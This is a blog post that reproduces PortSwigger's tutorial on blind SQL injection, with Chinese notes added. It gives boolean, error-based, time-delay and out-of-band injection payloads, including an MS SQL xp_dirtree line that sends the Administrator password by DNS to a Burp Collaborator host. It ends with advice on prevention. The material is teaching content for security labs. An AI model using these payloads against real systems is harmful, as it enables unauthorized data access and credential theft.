---
title: Port-Swigger-Blind-SQL-injection
mathjax: true
toc: true
date: 2023-03-31 07:17:23
categories: SQL注入
tags: PortSwigger

---
[TOC]
###### tags: `PortSwigger`


# Blind SQL injection

In this section, we'll describe what blind SQL injection is, explain various techniques for finding and exploiting blind SQL injection vulnerabilities.


>[文章地址](https://portswigger.net/web-security/sql-injection/blind)




## What is blind SQL injection?

Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

With(对于) blind SQL injection vulnerabilities, many techniques such as [`UNION` attacks](https://portswigger.net/web-security/sql-injection/union-attacks), are not effective because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

## Exploiting blind SQL injection by triggering conditional responses

Consider an application that uses tracking cookies to gather **analytics about usage**（关于使用情况的分析）. Requests to the application include a cookie header like this:

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

When a request containing a `TrackingId` cookie is processed, the application determines whether this is a known user using a SQL query like this:

```!
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If it returns data (because a **recognized**（被认可的） `TrackingId` was submitted), then a "Welcome back" message is displayed within the page.

This behavior is enough to be able to exploit the blind SQL injection vulnerability and retrieve information by **triggering**（引起） different responses conditionally, depending on an injected condition. To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:

```
…xyz' AND '1'='1
…xyz' AND '1'='2
```

The first of these values will cause the query to return results, because the injected `AND '1'='1` condition is true, and so the "Welcome back" message will be displayed. Whereas the second value will cause the query to not return any results, because the injected condition is false, and so the "Welcome back" message will not be displayed. This allows us to determine the answer to any single injected condition, and so extract data one bit at a time.

For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. We can **systematically**(有秩序地) determine the password for this user by sending a series of inputs to test the password one character at a time.

To do this, we start with the following input:

```!
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.

Next, we send the following input:

```!
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is `s`:

```!
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

We can continue this process to systematically determine the full password for the `Administrator` user.

#### Note

The `SUBSTRING` function is called `SUBSTR` on some types of database. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

**LAB**



[Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)



## Inducing conditional responses by triggering SQL errors

>通过触发SQL错误引发条件响应。

该例中查询是否返回数据并不会对页面的响应有任何影响，所以之前的技巧失效了。此时我们又当如何？文中介绍了一个通过触发SQL错误从而使得页面返回不同的响应的技巧。

这背后的原理是什么呢？答案也十分简单。

首先假设应用程序在SQL语句报错时会弹出报错信息，正常执行时则没有回显。在这种情况下，我们可以通过注入特殊的SQL语句来提取应用程序的信息。注入的SQL语句在条件为真时会引发一个SQL错误，而条件为假时则不会。这样一来，我们看到页面回显错误，就明白我们的条件为真，其他反之。





In the preceding example, suppose instead that the application carries out the same SQL query, but does not behave any differently depending on whether the query returns any data. The preceding technique will not work, because injecting different Boolean conditions makes no difference to the application's responses.

In this situation, it is often possible to induce the application to return conditional responses by triggering SQL errors conditionally, depending on an injected condition. This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false. Very often, an unhandled error thrown by the database will cause some difference in the application's response (such as an error message), allowing us to infer the truth of the injected condition.

To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true. With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error. With the second input, it evaluates to `1/0`, which causes a divide-by-zero error. Assuming the error causes some difference in the application's HTTP response, we can use this difference to infer whether the injected condition is true.

Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:

```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

#### Note

There are various ways of triggering conditional errors, and different techniques work best on different database types. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).





**LAB**


[Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
- Oracle 数据库，过滤了 and。



## Exploiting blind SQL injection by triggering time delays

该例中，应用程序会捕获数据库的错误并进行处理，所以SQL语句执行出错将不再对应用程序的响应造成影响，那么刚讲到的技巧就无效了。


文中在此处又提出了一个新的技巧，通过在SQL语句中有条件地触发时间延迟完成注入。背后的原理是什么呢？

在一般情况下，应用程序是同步地处理SQL语句的执行的，这意味着其会等待查询结果的返回，之后才会给客户端发送响应。所以，如果我们可以构造一个基于我们猜测条件的SQL语句，该SQL语句在条件为真时执行时间很长，而条件为假时执行时间很短。那么我们便可通过收到HTTP响应所花费的时间来判断猜测条件的真假，从而成功检索出信息。

SQL语言中能够引起时间延时的函数特别多，并且不同的数据库类型对应的延时函数也是不一样的，详情可以参看PortSwigger的备忘录。


In the preceding example, suppose that the application now **catches**（捕获） database errors and handles them gracefully. Triggering a database error when the injected SQL query is executed no longer causes any difference in the application's response, so the preceding technique of inducing conditional errors will not work.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays conditionally, depending on an injected condition. Because SQL queries are generally processed synchronously by the application, delaying the execution of a SQL query will also delay the HTTP response. This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received.

The techniques for triggering a time delay are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to test a condition and trigger a delay depending on whether the expression is true:

```
'; IF (1=2) WAITFOR DELAY '0:0:10'-- 
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

The first of these inputs will not trigger a delay, because the condition `1=2` is false. The second input will trigger a delay of 10 seconds, because the condition `1=1` is true.

Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:

```!
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

#### Note

There are various ways of triggering time delays within SQL queries, and different techniques apply on different types of database. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

**LAB**



[Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)



**LAB**



[Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)



## Exploiting blind SQL injection using out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques


>这一关我受益良多，因为之前并没有利用过带外注入获取数据。下次我打算在一些CTF题目中试试能否利用该技巧。

在此处依然是执行了一个存在漏洞的SQL语句，但是执行是否出错、执行所花费的时间都不会对页面响应造成影响，在这种情况下，SQL盲注还可以利用吗？

答案是可以的，这就是著名的OAST-带外注入技巧。

带外注入是什么呢？

根据我的理解，带外注入就是我们注入一个能够和外部系统进行网络交互的SQL语句。在该网络交互中，我们可以让SQL语句发送一些数据库信息，如表名、列名等。

在这样的情况下，若我们可以控制这个外部系统，那么我们就可以获取到网络交互的信息，从而拿到数据库的信息。

从以上描述中也可以看到，带外注入的利用条件是SQL语句能够和外部系统进行网络交互。在实际情况下，我们有很多协议可以进行网络交互，但其中最著名也是最好用的就是DNS协议。最好用体现在哪里呢？

主要体现在一般的产品环境中都不会限制应用程序向外发起一个DNS查询请求，因为产品的正常运行可能就需要用到DNS。所以我们可以利用这一点，在我们注入的SQL语句中发起一个DNS查询请求，并携带上数据库的敏感信息，最终完成整个注入流程。

最后的问题是外部系统，若我们采用DNS协议进行注入，此时显然我们要有一个可控的DNS域名服务器。自己搭建显然过于麻烦，所以推荐各位看官使用Burp Suite 的
Burp Collaborator，详情请看下文。


Now, suppose that the application carries out the same SQL query, but does it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, however none of the techniques described so far will work: the application's response doesn't depend on whether the query returns any data, or on whether a database error occurs, or on the time taken to execute the query.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. As previously, these can be triggered conditionally, depending on an injected condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself.

A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). This is because very many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems.

The easiest and most reliable way to use out-of-band techniques is using [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator). This is a server that provides custom implementations of various network services (including DNS), and allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Support for Burp Collaborator is built in to [Burp Suite Professional](https://portswigger.net/burp/pro) with no configuration required.

The techniques for triggering a DNS query are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to cause a DNS lookup on a specified domain:

```!
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

This will cause the database to perform a lookup for the following domain:

```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

You can use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.


关于Burp Collaborator 的使用可以参看这篇[文章](https://blog.csdn.net/fageweiketang/article/details/89073662)

>虽然我是破解版，但是我的Collaborator 还是可以使用的。

**LAB**



[Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)



Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:

```!
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

This input reads the password for the `Administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This will result in a DNS lookup like the following, allowing you to view the captured password:

```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

Out-of-band (OAST) techniques are an extremely powerful way to detect and exploit blind SQL injection, due to the highly likelihood of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.

#### Note

There are various ways of triggering out-of-band interactions, and different techniques apply on different types of database. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

**LAB**

**PRACTITIONER**

[Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)



## How to prevent blind SQL injection attacks?

Although the techniques needed to find and exploit blind SQL injection vulnerabilities are different and more sophisticated than for regular SQL injection, the measures needed to prevent SQL injection are the same **regardless of**（无论） whether the vulnerability is blind or not.

As with regular SQL injection, blind SQL injection attacks can be prevented through the careful use of parameterized queries, which ensure that user input cannot interfere with the structure of the intended SQL query.

